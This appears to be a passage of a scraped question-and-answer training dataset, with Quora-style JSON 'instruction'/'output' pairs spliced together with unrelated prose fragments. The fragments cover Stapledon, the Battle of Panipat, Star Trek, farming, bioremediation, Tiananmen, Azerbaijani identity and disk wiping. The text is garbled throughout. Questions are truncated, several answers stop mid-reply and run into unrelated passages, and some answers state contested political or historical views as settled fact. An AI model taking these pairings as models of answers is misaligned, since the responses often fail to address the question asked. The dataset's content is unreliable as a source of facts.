Written nearly a hundred years ago, he was way ahead of his time and if you read either book and think “I’ve read this idea before somewhere” then that is because these books have massively influenced a LOT of other writers. Last and First Men deals with the entire imagined future history of mankind’s evolution over the next two billion years, whereas in Starmaker he obviously decided to be a bit more ambitious(!) and go for an entire history of the universe. The scope of his imagination was incredible. And he casually throws ideas into the books over just a few lines sometimes that other writers would later develop entire books around.

Afghan side was led by the Afghan Durrani Empire, the Afghan Rohillas, the Mughal state of Awadh and the alliance numbered around 1,00,000 soldiers. Imad-ul-Mulk of Delhi, the Maratha ally had promised Agra(the Maratha-controlled Mughal subah captured by the Afghans) to the Jat Suraj Mal for his support but the Marathas insulted Imad and refused to trade Agra. Suraj Mal was also insulted when he jeopardized the alliance for Agra, and this is how Suraj Mal and Imad left the Maratha side. Marathas invited Sikhs but Sikhs had previously, experienced how Marathas treat their allies. Rajput rulers hated Marathas for draining out the Rajput treasuries for the chauth tax and when not paid, then forceful recovery of tax in addition of the huge war expenses. Maratha camp at Panipat was besieged by the Afghan side, the food supply was cut off so the Maratha leaders tried to conclude a peace but the Afghan king was seeking revenge for the Afghan losses of Kunjpura. Revengeful Peshwa at Pune, then called off his remaining forces from Mysore for the next campaign in North India but this time, the Afghan king himself offered a peace.

He will tell all reasons as to why he is postponing that work and playing with dinosaurs. One day I tried saying the same thing this way. 'Oh great. you left your plates as is. I will keep it in sink and become the good boy in home’. It worked immediately. He ran to keep those in sink ahead of me. Tried the same for vegetables. Told him that ‘I keep vegetables in your plate just for namesake. Just don't eat it as always so that I can take that as well and become extra healthy.’ He started eating bitter gourd just like that and told me 'See I will only finish.

Kirk cheats, we know. Scott doesn’t even want command but he identifies a physical device which he can and does use in simulated combat but which didn’t work when it was tried for real… by him. At the same time, he wipes out more simulated Klingons than anyone else managed. The computer just sends in more Klingons. And Sulu tells the KM that he can’t carry out the rescue and won’t try, leading to temporary mutiny on his simulated bridge. I should say that being in a book means it didn’t “happen”. I would expect Data to decide as Sulu did there, that it can’t be done. To recognise this should count as a pass, although it may be asked whether the Academy means to teach cadets not to attempt the impossible. Maybe you are meant to do that only at the point of deciding to break rules, better to break the laws of physics than the Prime Directive. I think someone said that in one film it says that Data won the encounter, which is more like Scott or like Kirk. Novel “The Galactic Whirlpool”, out before “Star Trek II”, included another sneaky test for command-grade insight: you’re in a spacesuit driving a buggy on Earth’s moon. You get bug spots on your suit helmet. What do you do? You are not told this is a test, you just have a mission to drive somewhere. But calling for advice loses points. The spots are actually moon dust in an unusual state, electrically charged or something. Cadet Kirk stops, uses supplies to fit mudguards to the buggy, and drives on. It seems that in real life, a lot of psychology tests and experiments are not testing you at the task you were given to do. Mel Gilden’s novel “Boogeymen” gives Wesley Crusher the no longer practised KM test as an exercise on the Enterprise’s holodeck, with his childhood monster “Boogeymen” as enemy since Worf is his babysitter. Welsey is crushed, then it goes wrong and when they leave the holodeck, the Boogeymen are still pursuing them - it’s one of those fake exit stories. I think one of Jean Lorrah’s Data novels, “Survivors” and “Metamorphosis”, includes an important test for 24th century officers, and for Data. You’re on a holodeck, but your mind was altered to think it’s real. You’re on a mission gone bad on a planet that hasn’t contacted aliens, except for you being there secretly. Your team are captured and in danger and you have to decide whether to take action that could violate the Prime Directive. In fact, the correct conclusion is that you do not have enough information to decide."},{"instruction":"Why is Jimi Hendrix considered to be so influential on guitar?","output":"There are several reasons why Hendrix is one the most influential guitarists of popular music. He redefined the electric guitar approach and sound during his generation. And to add, he was an exceptional guitarist and very creative songwriter. His style was blues, soul, r&b based but rock and jazz was also added to round out his overall style. Hendrix played with a lot of bands & musicians before going to England in 1966. And going to England with Chas Chandler was sort of a godsend for him. That put him in the company of the popular British music echelons of musicians and performers. He was given the chance to expand and blossom musically with the Jimi Hendrix Experience. The ‘Are You Experience?’, ‘Axis Bold As Love’ and ‘Electric Ladyland’ albums influenced the popular music soundscape. Nothing like it had been heard before that time.

In fact, many people say that self-confidence is a gift from the universe and anyone can take advantage of it, regardless of whether they are male or female. If you are shy, you may be trying to overcome that fact and that will help you. However, many people do not take the time to analyze whether or not they have self-confidence, thinking it's just part of their upbringing. It is much more than that, but the real question to ask yourself is whether or not you feel good about who you are. If you are trying to improve your life, you probably are going to go to great lengths to make sure that you look and feel your best. Self-confidence is important and if you have this, it can help you in many different ways. For example, many people say that they feel better about themselves after they eat a healthy meal. The same thing happens when you feel better about yourself. You tend to eat more healthily, take better care of yourself physically and use healthy substances to boost up your mood. It doesn't matter what the reason behind it is, as long as you feel good about yourself. Once you realize that you don't have to put a lot of effort to have self-confidence, you will find that it really comes into play. People who believe they have this kind of power will often go to great lengths to get it. They are willing to spend hours of their lives trying to perfect the art of being confident. It isn't easy though, and they are sometimes frustrated at how hard it can be to maintain it. That frustration will show on their faces and they will become frustrated themselves because they just can't seem to make a big difference. However, the key to becoming more confident is to keep at it until you find success and your mind and body start to believe in what you have to offer. Once your mind and body have been convinced that you are worth of having confidence, you will find that you will enjoy the change in your life."},{"instruction":"What are the best color of loafers to buy that go with almost everything (jeans, chinos)?","output":"Beige or navy"},{"instruction":"Do you think John Lennon would have been a Nirvana fan?","output":"Sure, just not “as rabid” as either of their fans are!"},{"instruction":"w can I buy IKEA or IKEAlike furniture in India?","output":"First IKEA store is open in hyderabad now and soon to open in mumbai and delhi too."},{"instruction":"What is it like being a farmer? Are farmers happy?","output":"My mom is a farmer and I have seen the trials and prizes of a farmer first hand. Farming is uncertain at its best and downright ruthless at its worst. There are many factors which should click just right to get the perfect yield. The rain must be just right. For crops like maize, rain is a godsend. For onions, it must not be too much. The seeds, fertilizers and pestisides must work as advertised. For example, we are preparing some part of our land for onion cultivation and the first problem we faced was nut grass. It might look innocent to look at, but this thing is a bane for crop yield as they suck in all the water like a greedy pig. Especially onions as they are weak and they would never get enough water if nutgrass is not removed. We usually use Roundup ( a pesticide) for removing nutgrass, but this year we used a different one as it is supposed to be exclusive for nutgrass. But it didn't work as the rain came just two days after spraying. For roundup, it doesn't matter even if it rains after just 8 hours, but for this new pesticide, the ‘no rain' period was four days. Now we have to patch things up fast as time is running out. It takes 15 days to prepare the farm to cultivate after spraying. The land too plays an important role. The land near our home has absolutely no ground water and we have to depend on rainfall. When the rain comes, our wells will come to life as there is a 100 acre pond nearby. Then we can get a maximum of two yields after which we have to wait for rainfall again. On the other hand, we have land in Aliyar which is just near the Aliyar river and there will be an excess of water all through the year. But the land there is not much fertile and coconut trees are the best option there. There will be income all year, but never much profit when compared to crops like onion and Tomato. It also depends on the Market rate. Sometimes the prices will skyrocket and we will rake in the profits. Sometimes the prices won't be even enough to cover the harvest cost, much less the cultivation cost. Most of the times, Farming is a gamble. But as the times change and as the youngsters are taking over, the situation is starting to change. More scientific innovations are coming into use and they are changing the game. As for happiness, My mom is happy when she sees this. Despite all the uncertainties and worries, seeing the green waving around in the wind never fails to bring a smile in the face."},{"instruction":"w can I lose 10 pounds in 3 weeks without exercising?","output":"I’m sorry, but there is no easy way that you can follow to lose weight quickly.

These processes involve the use of microorganisms to break down and remove pollutants from the environment, ultimately restoring ecosystems and minimizing the impact of human activities. Here's how microbiology contributes to these processes: Biodegradation: Microorganisms have the ability to degrade a wide range of organic compounds, including pollutants such as petroleum hydrocarbons, pesticides, and industrial chemicals. Certain bacteria, fungi, and other microorganisms produce enzymes that can break down complex molecules into simpler, more manageable forms. Through their metabolic activities, microorganisms utilize these compounds as sources of energy and nutrients. By harnessing the natural biodegradative capabilities of microorganisms, we can effectively mitigate the environmental contamination caused by various pollutants.Bioremediation: Bioremediation involves the use of microorganisms to clean up contaminated sites. There are two main types of bioremediation: in situ and ex situ.a. In situ bioremediation: In this approach, microorganisms are introduced directly into the contaminated site. They utilize the pollutants as a food source and degrade them into less harmful byproducts. This process can be enhanced by providing necessary nutrients, oxygen, or optimizing environmental conditions to support microbial growth and activity.b. Ex situ bioremediation: In ex situ bioremediation, contaminated materials are excavated and treated in a controlled environment outside the site. Microorganisms are added to the contaminated material, such as soil or water, and provided with optimal conditions for biodegradation. Once the contaminants are broken down, the treated material can be returned to the site or disposed of safely. Both in situ and ex situ bioremediation methods can be used for different types of pollutants and environmental conditions. Microorganisms can be naturally occurring or genetically engineered to enhance their biodegradative capabilities and increase the efficiency of the remediation process. Bioaugmentation and biostimulation: Bioaugmentation involves the addition of specific microorganisms to enhance the degradation of certain pollutants that are not readily biodegradable by the existing microbial community. Biostimulation, on the other hand, focuses on stimulating the growth and activity of indigenous microorganisms already present at the contaminated site. These approaches often involve providing additional nutrients, altering environmental conditions, or introducing electron acceptors such as oxygen to enhance microbial activity and pollutant degradation. By utilizing microbiology-based processes like biodegradation and bioremediation, we can effectively reduce the levels of contaminants in the environment, restore ecosystems, and promote environmental sustainability. These approaches offer cost-effective, environmentally friendly alternatives to traditional remediation methods and contribute to long-term preservation of our natural resources."},{"instruction":"What are the best telegram groups for civil service preparation?","output":"🔔 The best telegram Channel/ groups for UPSC Civil services preparation:- Link: 👉 [LINKED_TEXT: EXAM SNAP] [URL: https://t.me/ExamSnapofficial] [LINKED_TEXT: Exam Snap™ (UPSC)📜All UPSC/PSC and other govt exams related info & materials at one place📜 ◾️UPSC Civil Services Prelims & Mains ◾️State PCS ◾️ UPPCS, UKPCS, BPSC, HPSC #UPSC #thehindu #civilservices #IAS #Editorialanalysis #currentaffairs #IAS #IPShttps://t.me/ExamSnapofficial] [URL: https://t.me/ExamSnapofficial]Keep smiling, God bless you all :)"},{"instruction":"Why does my cat smell so good, despite me never giving him a bath in his entire life?","output":"Cats in good health meticulously spend hours every day bathing themselves and their saliva contains a natural deodorant which evolutionarily helped them survive by being less detectable to other predators! :)"},{"instruction":"f buying a new, high end road bike and you can only choose one, do you go with electronic shifting or disc brakes?","output":"If you actually want disc brakes… than disc brakes. Electronic shifting is nice, but first adopters of electronic groupsets are paying a high premium for a system which is fundamentally simpler than a fine mechanical one. In five years electronic shifting will filter down to the budget groupset level, and every decent road bike will have it as the top end groupsets will move to the next best thing. Personally, I’d first budget it so I have a power meter on the bike, though, even speccing the rest of it down. If I could only afford mechanical 105 and rim brakes, but could afford to upgrade with a power meter, a good saddle and a pair of good tires, that's really something I could live with and better than a stock bike with electronic shifting. It's just a huge help in training and for pacing. Even a huge climb becomes a simple matter of riding by the numbers (if you have adequate gearing). How cool is that! Picture above: Getting from sea level to the top is a lot less intimidating once you know all you need to do is to hold 200W for two hours and change (barring the odd ramp where you have to go a bit higher and a flatter bit 2/3rds of the way in where you can recover a bit) and you’ll be up there, easily within the abilities of the average rider. If I can afford this with budget to spare, then I’d go for discs which I am a fan of, unless I am building a steel bike where I’d take rim brakes for the style of it.

The only difference here is that they use assistive technologies to access the computer and the programming language. These assistive technologies include a screen reader, braille display, or speech recognition software. The role of the screen reader is to read the content on the screen through raised dots. And the speech recognition software interprets the spoken commands and translates them into typed commands. Here, website accessibility also plays an important role, as visually impaired individuals won't be able to code if the software or website they are using to code is not accessible to these assistive technologies. This also allows visually impaired programmers to customize their computer environment and programming language. For instance, they can increase their screen's font size or contrast or adjust their text editor to be more accessible. This includes increasing the verbal feedback the software receives when typing in commands or even adding text-to-speech for commands and feedback. Some zooming software also allows visually impaired programmers to zoom in on text and other elements of the user interface, making them easier to see. With the help of different accessible IDEs (Integrated Development Environments), visually impaired individuals can easily program. This software includes features such as keyboard navigation, text-to-speech, and braille support. Here are some examples of visually impaired computer programmers who have made significant contributions to the field: Ray Kurzweil: Ray Kurzweil is a blind American computer scientist and futurist. He is best known for his work on artificial intelligence, speech recognition, and text-to-speech software.Daniel Kish: Daniel Kish is a blind American man who uses echolocation to navigate the world. He is the founder of World Access for the Blind, a non-profit organization that provides training and support for blind people who want to learn echolocation. The above are only a few examples; there might be a lot more visually impaired individuals who are successful programmers. These are some ways in which visually impaired computer programmers can program more easily and effectively. With the use of assistive technology and website accessibility, they can now have equal access to programming language, and by adjusting their environment, they can make the entire programming experience more accessible and comfortable."},{"instruction":"w do you know dinosaurs actually existed just other than fossils?","output":"If you take the whole collection of fossils as just fossils, including the trace evidence, then that is what we have.

If it were, it would retain its classification and not reach the American public until such time that it was determined the species did not represent a current threat, regardless of the age of the fossil."},{"instruction":"What is the best hotel you have ever stayed at, and why?","output":"The thing is, I never stayed at bad hotels. I don’t care much about luxury, so as long as bed doesn’t break under me when I sleep, and there is some hot water, electricity and (in case I don’t have mobile broadband) some kind of internet access, I’m fine. Throughout my life I experienced everything from Ritz-Carlton to decrepit crew sleeping room at Pugachovka glider airfield in Oryol region in Russia… that was where the bed broke under me in the middle of the night while I slept calmly (although that wasn’t an hotel). Last five nights I spent at the Russian research MV Gelendzhik faring through the Sea of Japan, and 27-year old bunks here are comfortable enough for me. Beds at the Ritz-Carlton are too soft for my taste. I like it in Ibis and Azimut. Tower Hill Hotel in Busan (South Korea) is really nice as are Vincci Maritimo in Barcelona (Besos Mar), Tygyn Darkhan in Yakutsk and Park Inn Pulkovo Airport in St. Petersburg Pulkovo. The best hostels I stayed at are Hush Kadıköy Moda in Istanbul, Turkey (they have really sumptuous breakfasts), Orange Vaclavske Namestí in Prague, Czechia (excellent location at very good price), and DIC in Ljubljana, Slovenia (open only during summer). And the best guesthouse ever is Kakoste in Gozd Martuljek, Slovenia."},{"instruction":"am 15 years old.

You will always impress investors with results rather than an idea. Also keep in mind, you need to show that it does or can in time make money. Investors want to know how they will ultimately get their money back so if there is no path to monetization then no one will be interested in funding it. I would start but understanding what is needed to code your first app. There’s is plenty of free information on how to do this online.

It implies the presence of the deepest connection of [LINKED_TEXT: friendship] [URL: https://www.psychologytoday.com/us/basics/friends], of lives lived as comrades from the distant past. Many of us have people in our lives with whom we feel the bond described by the word kenzoku. They may be family members, a mother, a brother, a daughter, a cousin. Or a friend from grammar school with whom we haven't talked in decades. Time and distance do nothing to diminish the bond we have with these kinds of friends. The question then arises: why do we have the kind of chemistry encapsulated by the word kenzoku with only a few people we know and not scores of others? The closer we look for the answer the more elusive it becomes. It may not in fact be possible to know, but the characteristics that define a kenzoku relationship most certainly are. What draws people together as friends? Common interests. This probably ties us closer to our friends than many would like to admit. When our interests diverge and we can find nothing to enjoy jointly, time spent together tends to rapidly diminish. Not that we can't still care deeply about friends with whom we no longer share common interests, but it's probably uncommon for such friends to interact on a regular basis.History. Nothing ties people together, even people with little in common, than having gone through the same difficult experience. As the sole glue to keep friendships whole in the long run, however, it often dries, cracks, and ultimately fails.Common values. Though not necessarily enough to create a friendship, if values are too divergent, it's difficult for a friendship to thrive.Equality. If one friend needs the support of the other on a consistent basis such that the person depended upon receives no benefit other than the opportunity to support and encourage, while the relationship may be significant and valuable, it can't be said to define a true friendship. What makes a friend worthy of the name? A commitment to your [LINKED_TEXT: happiness] [URL: https://www.psychologytoday.com/us/basics/happiness]. A true friend is consistently willing to put your happiness before your friendship. It's said that \\"good advice grates on the ear,\\" but a true friend won't refrain from telling you something you don't want to hear, something that may even risk fracturing the friendship, if hearing it lies in your best interest. A true friend will not lack the mercy to correct you when you're wrong. A true friend will confront you with your drinking problem as quickly as inform you about a malignant-looking skin lesion on your back that you can't see yourself.Not asking you to place the friendship before your principles. A true friend won't ask you to compromise your principles in the name of your friendship or anything else. Ever.A good influence. A true friend inspires you to live up to your best potential, not to indulge your basest drives. Of course, we may have friends who fit all these criteria and still don't quite feel kenzoku. There still seems to be an extra factor, an [LINKED_TEXT: attraction] [URL: https://www.psychologytoday.com/us/basics/mating] similar to that which draws people together romantically, that cements friends together irrevocably, often immediately, for no reason either person can identify. But when you find these people, these kenzoku, they're like priceless gems. They're like finding home. How to attract true friends This one is easy, at least on paper: become a true friend yourself. One of my favorite quotations comes from Gandhi: \\"Be the change you wish to see in the world.\\" Be the friend you want to have. We all tend to attract people into our lives whose character mirrors our own. You don't have to make yourself into what you think others would find attractive. No matter what your areas of interest, others share them somewhere. Simply make yourself a big target. Join social clubs organized around activities you enjoy. Leverage the Internet to find people of like mind. Take action. As I thought about it, there's merely one individual in my life I consider kenzoku.

Watch the following video that included an ending which news outlets like CNN and BBC like to cut in their videos, but gave an important context of the event: The event happened on June 5, not June 4; the tank was leaving Tiananmen Square, not entering. The “tank man” was dragged away by other bystanders at the end of the video, he was not captured by the PLA, nor there was any police around. The authority had no idea who he was, Jiang Zhemin was really confused when he was asked about him in a later interview by an American TV show. The tank stopped as you can see in the video and tried their best to avoid him, no police or soldiers came out beat him. To most Chinese, June 4 is like a bad dream, it has nothing to do with the freedom and democracy that the US invades other countries over, the students wanted to get rid of the corruption that came with the economic reform, but not sure how; the whole event caused more destruction to the political reform of China than any good that came out of it, the liberal faction of CCP was decimated afterwards for failed attempts to work with the students, and that must have delayed the democratic reform for decades. I don’t know what to think, as I originally thought that the picture was shot on June 4, the “Tank Man” was trying to stop the tanks moving into the square, and he was crushed after the photo was taken, then I learned that none of what I was led to believe was true. Nowadays, whenever there is a protest, there always will be a photo, staged or not, that shows a lone individual standing up against authority, it does make good propaganda, doesn’t it."},{"instruction":"Can you burst a weather balloon with your bare hands?","output":"Probably not.

If you are learning Bernoulli's principle then also learn where it can be applied Like steady incompressible and inviscid flow should be there to apply.I used to practice writing formulae on a rough copy so that I don't skip any question just because I didn't remember the formulae. There are some direct easy questions come in GATE for that formulae is necessary. Also I didn't want to waste my time in recalling the formulae during exam.

Here are a few examples: Advantages: Improved collaboration: Project management software can help teams collaborate more effectively by providing a central location for all project-related information, including tasks, files, and discussions.Increased efficiency: Project management software can help teams work more efficiently by providing tools for task prioritization, delegation, and tracking.Improved transparency: Project management software can provide transparency into project progress and status, helping teams stay aligned on project goals and timelines.Easier reporting: Project management software can provide easy access to project reports, such as burn-down charts or task completion rates, which can help teams identify areas for improvement. Disadvantages: Learning curve: Project management software often has a steep learning curve, which can make it difficult for teams to adopt and use effectively.Overreliance on technology: Project management software can make teams overreliant on technology, which can be problematic if there are issues with the software or if team members do not have access to it.Data security concerns: Project management software can create data security concerns, particularly if sensitive project information is stored on third-party servers.Cost: Project management software can be costly, particularly for small teams or startups, which may prefer to use simpler, more affordable solutions. Overall, project management software can be a valuable tool for teams using a Kanban-style approach, but it is important to weigh the advantages and disadvantages carefully and choose a solution that meets the team's needs and budget."},{"instruction":"Do US soldiers keep their guns?","output":"If a US Soldier has a personal firearm then they can retain their personal firearm just like any other US citizen. Of course the standards of what kind of gun you can buy, store, or carry varies by locality and Soldiers move every few years. So they might have to store a gun while they move overseas for a few years. However US Soldiers do not get to keep their military issued guns. When I worked as security forces in the Air Force our gun was issued at the beginning of the shift and returned at the end of the shift. In combat zones the Army will often issue a firearm when you arrive into the combat zone and you turn it in just before you leave the combat zone. So there is a lot of variation depending if it’s a personal weapon versus a military issued weapon and it varies by location and duty."},{"instruction":"it safe to apply aloe vera gel on the face overnight?","output":"Yes, aloe vera gel is safe to keep on your face overnight.

ASIAN TRADERS BEAT COLUMBUS Trade was taking place between East Asia and the New World hundreds of years before Christopher Columbus arrived in the area in 1492. Archaeologists have made the suggestion following the discovery of a series of bronze artefacts found at the 'Rising Whale' site in Cape Espenberg, Alaska. They found what they believe to be a bronze and leather buckle and a bronze whistle, dating to around A.D. 600. Bronze-working had not been developed at this time in Alaska, and researchers instead believe the artefacts were created in China, Korea or Yakutia. 'We're seeing the interactions, indirect as they are, with these so-called \\"high civilisations\\" of China, Korea or Yakutia,' Owen Mason, a research associate at the University of Colorado. Researchers believe those who lived at the Rising Whale site may be part of what scientists call the 'Birnirk' culture. This is a group of people who lived on both sides of the Bering Strait and used skin boats and harpoons to hunt whales, LiveScience reports. The latest discovery of bronze artefacts backs up earlier evidence for trade between Alaska and other civilisations prior to 1492. He said: 'These ancient Chinese writings in North America cannot be fake, for the markings are very old as are the style of the scripts. 'As such the findings of this scientific study confirm that ancient Chinese people were exploring and positively interacting with the Native peoples over 2,500 years ago. 'The pattern of the finds suggests more of an expedition than settlement.

This week, two major studies of the DNA of living and ancient people try to settle the big questions about the early settlers: who they were, when they came, and how many waves arrived. But instead of converging on a single consensus picture, the studies, published online in Science and Nature, throw up a new mystery: Both detect in modern Native Americans a trace of DNA related to that of native people from Australia and Melanesia. The competing teams, neither of which knew what the other was up to until the last minute, are still trying to reconcile and make sense of each other’s data. “Both models … see in the Americas a subtle signal from” Australo-Melanesians, notes Science co-author David Meltzer, an archaeologist at Southern Methodist University in Dallas, Texas. “A key difference is when and how it arrived in the New World.” The Nature team concludes it came in one of two early waves of migration into the continent, whereas the Science team concludes it came much later, and was unrelated to the initial peopling."},{"instruction":"IQ test academy really certified or it is a scam?","output":"The test is far too easy; I believe that the only purpose is to give you a good feeling and of course to buy the very expensive results."},{"instruction":"w do I make money online without an investment in 2023?","output":"There are several ways to make money online without spending money.

He chose this name so that minority groups living in Azerbaijan too could feel themselves as the part of this country despite the fact Turks had the overall majority in Azerbaijan. Prior to him there was no such a name or concept and the ones living both northern and southern Azerbaijan initially had some certain difficulties in pronouncing that word (some of them were prononucing it as “Azarbaijan” or “Edilbeijan” or “İtilbeijan” or “Azarbeiijan” etc rather than the correct pronounciation of the word which Azerbaijan). All of those people living in both northern and southern Azerbaijan were identifying themselves with just one word and that was Turk or Turkish prior to the introduction of this word “Azerbaijan”. For the record Shah Ismail l wasn’t speaking or writing poems in Azerbaijan Turkish. He was writing his poems in a common Turkish which was used in Iran, Iraq and Anatolia at his time. It’s also important to note that Turkish spoken in Turkey in 1940s was much closer to Azerbaijan Turkish and the Turkish spoken by Shah Ismail. The word Turkic is the invention of Soviet ideology which tries to solve the problem what is referred as “nations question” within Soviet union by first separating people from Turkish ethnicity from the Turks living in Turkey and then giving them tribal names and thus banning them to use the word of Turk or Turkish to identify their ethnicity. So Turkic was an ideal innovation for them. Prior to the invasion of Turkish lands in Central Asia and Caucasus by first Russian Empire (in the 19th century) and then the former Soviet Union (in the early 20th century) those people belonging to Turkish ethnicity (just like the Turks in Turkey) were always uttering the word “Turk” (or Turkish which is the English form of saying Turk and the language Turks speak) while talking about their ethnicity. When Turks embraced Islam they not only changed their religion but also ultimately their life styles and thus they left one civilization circle which they belonged and entered Islamic civilization circle. Azerbaijan Turks and Anatolian Turks were initially representing the Turkish culture after entering the Islamic civilization (just like the rest of the Turkish groups in Central Asia). They’re later both exposed to western civilization but ended up entering in different influences as they (except Turkey) lost their sovereignities. Turks living in Turkey as a sovereign nation are more explicit about their ethnicity and they do not hesitate to call the ones from Turkish ethnicity like themselves “Turks” or “Turkish” rather than Turkic (for them all the historical empires founded by the people from the same ethnicity with themselves too were Turkish empires not Turkic) but for the Turks living in southern Azerbaijan in Iran and northern Azebaijan the word “Turk” was something like taboo as they were captive nations. Today people from northern Azerbaijan after gaining their independence are more courageous to use the word “Turk” and “Turkish” rather than Turkic. Yet, there’re still some groups within Azerbaijan which are either still under the influence of Soviet ideology or suffer from the concept what’s known as learned helplessness in psychology are reluctant to use the word “Turk” or “Turkish” and prefer the word “Turkic” instead. The ones in Iran are still a captive nation and thus they use the terms like “Azerbaijani”, “Irani” or “Turkic” depending on how close they feel themselves to the current mullah regime in Iran despite the fact that objectively speaking they’re Turk or Turkish. BTW ethnicity and nationality are two slightly different concepts. Ethnicity is more related with the culture and thus language (which is the most important aspect of culture) and the sense of belonging and sense of identity. Nationality is more to do with the citizenship of the people which is about their citizenship rights. In modern states the citizens living in one country have all the same citizenship rights regardless their ethnicities. In the older times different ethnic groups living in one state could have different citizenship rights."},{"instruction":"Which is a better band: Iron Maiden or Judas Priest?","output":"You can't compare the two, in the same way that you can't choose the better song between \\"Panikiller - Judas Priest\\" and \\"Fear of the Dark - Iron Maiden\\"."},{"instruction":"w do airports ensure that luggage of one passenger is not picked by another at the baggage claim area?","output":"The reason for this is that true stealing is rare.

There isn’t a thing like “I am doing this so I am genuine” for them. What you see them doing is what you see in them. Pure raw content."},{"instruction":"any way?","output":"Having strong self-confidence will allow you to obtain any goal you set for yourself. It’s not always easy having confidence in yourself, but it’s how you develop a positive mindset. If you lack confidence then it can be the underlying cause of what’s holding you back from taking the next step. I never really had any confidence in myself until I learned that lack of it was causing my negative thoughts and behaviors to increase. Here’s what has helped me have more confidence in myself: 1)Taking calculated risks One of the key pillars to strengthening your self confidence is taking more strategic risks. This is one of the key habits of the ultra successful. Realize that every risk you don’t take is another opportunity missed. When you don’t take action on what is important to you, it takes a hard hit on your confidence meter. By taking calculated risks you decide to do something that’s going to add value to your life or someone else’s. Most of the people who read this aren’t going to do anything after they finish because they’re scared and lazy. Start discovering what it is you want to learn, teach or master. Your confidence strengthens by having utmost faith in your decision making. You must start trusting your intuition. Are your daily habits aligned with where you want to go? If you aren’t pursuing calculated goals, then it’s going to be difficult reaching your destination. You should be doing something everyday that helps bring your vision to life. It’s the small steps that engineer the foundation of your success. 2)Find your voice You mustn’t allow the opinions of your family, friends, or society paralyze your choice of going after your goals and dreams. The people that are going to give you the most criticism will be the individuals closest to you. In the midst of all the noise you must try to hear your own inner voice. When you begin pursuing the stuff you’re interested in, you set the foundation for identifying your passions are and aren’t. Take the time to listen to what that inner voice is trying to tell you. There’s always going to be people that unintentionally interfere with your personal growth. These people tend to project their fears and uncertainty onto others unconsciously. They don’t have awareness of their thoughts or behaviors. YOU are the only person who has control over the outcome of your reality. Sometimes that inner voice isn't you. It’s the accumulation of what you have been conditioned to believe about yourself. Follow your heart and don't be afraid to pursue things that you find interesting or inspirational. 3)Embrace failure An important thing to remember about failure is that it teaches you where you need to improve. Failure isn’t something you should be afraid of because it lays the foundation of the lessons that you need to learn. It’s through trial and error that you educate yourself about what your strengths and weaknesses are. The key to self-improvement is figuring out what kind of thoughts and emotions are most beneficial in helping you reach your goals. By failing forward you enable your mind to become adaptable when you face challenges. When you are going after big goals there is going to be times where you will fail and that’s okay. You must take a step back from the situation and be aware of what you can learn from that challenge. The more you fail at something the less chance you have at failing again. This kind of mentality plays a major role in helping you stay committed to attaining your goals. Remember… By taking calculated risks you increase your chances of reaching any goal you set for yourself. Listen to your inner voice because it will help you on your mission. Don't be afraid to fail because it’s the only way for you to improve. As long as you’re making progress you’ll get where you need to be. Be patient. Thank you for reading!

This has led some people to theorize that, even after overwriting a sector, it may be possible to examine each sector’s magnetic field with a magnetic force microscope and determine its previous state. As a solution, many people advise writing data to the sectors multiple times. Many tools have built-in settings to perform up to 35 write passes – this is known as the “Gutmann method,” after Peter Gutmann, who wrote an important paper on the subject — “Secure Deletion of Data from Magnetic and Solid-State Memory,” published in 1996. You can use a disk-wiping program, such as DBAN (Darik’s Boot and Nuke.) Beyond Wiping If you’re still paranoid after reading the above explanations, there are a few ways you can go further. Performing 35 passes won’t help, but you can use a degausser to eliminate the drive’s magnetic field – this may destroy some drives, though.

Because the only indication this is so appears to be some highly speculative tabloid bollocks. Andrew is supposedly the Queen’s favourite child but for obvious and embarrassing reasons almost certainly doesn’t have much influence with her in general right now, and on the specific point of Charles becoming King he would be perfectly aware that this is certainly not up to him and not even up to the Queen herself. The law say Charles will be King and that’s that. Only if Charles himself chooses not to (spoiler: this almost certainly will not happen) or predeceases the Queen (not impossible but not super-likely either) will that change, and the law is equally clear that William is next in line and has been since 1982 when he was born. PS, this isn’t me beating the drum for Chuckles. I’m a republican and don’t particularly care for kings and queens, and I’m certainly not too bothered who the next one is.

It all goes back to the first carrier. They could not call an attack carrier a “CA”, because then it would be confused with the “CA” that meant “Cruiser, Attack”. So, carriers were labeled as “CV”’s. So, squadrons that use heavier than air airplanes are VA for attack squadrons and VF for fighter squadrons an VQ for electronic warfare squadrons, etc. —And squadrons that use helicopters are called HA’s etc. and ships that use lighter than air aircraft (like blimps) are called CZ’s. See? Quite simple. Trust me, about a week of that and learning how to tell time in the Navy and trying to understand why you must wear cammies on a ship and call a bathroom a head, and it will all make sense.

He happened to be the customer who fired us for bad communication, and also the one whom we ended up scamming (we were 16 year old’s with no idea how to run a business, it was unintentional). Our old pal looked up at the three of us, shook his head, and looked away. My fellow CEO’s and I made an executive decision not to go over and say hello…At one point in the movie, I went and stood by the side-door because I was feeling restless and wanted to stretch a bit, and I happened to kick this really cute girl right in the stomach, and when I apologized she just awkwardly stared at me. Those three things do not make my experience with The New Mutants a fond memory. 2: Tenet Tenet was pretty good, but there was this one lady in the theater, looked like freakin Toucan Sam from the Fruit Loops Commercials. Anyways, every time something crazy and confusing happened (quite often), she’d say- “Ohhh reallllllly, Ya think!?” Like it was the most obvious thing ever and the main characters were just a bunch of idiots. I think her goal was to make all us random strangers in the theater think she was really smart, but she just sounded dumb and everybody wanted her to shut up. 3: X-Men: Apocalypse I’m hesitant to write this one, because we were badly behaved 12-year-old’s at the time, but the guy behind my friend and I really sucked. Ya see, my friend’s Dad is a local news anchor, and he and his family get recognized in public sometimes. Anyways, we were throwing gobstoppers in the theater...as one does...and this one guy leans forward, grabs my friend, and says- “Hey! You! I know your dad! I’ve seen him on TV! You’d better straighten up or I’ll let him know you behaved this way!” That, of course, only encouraged us. So we continued. After the movie, we went to the bathroom, and this dude comes up and pees in the urinal right next to me, just so he can continue to scold me while we’re peeing. He then goes and finds my friend’s dad who was picking us up, and told him what wretched sinners my friend and I were. What a nut job. I might be forgetting some, but those weren’t exactly fun.

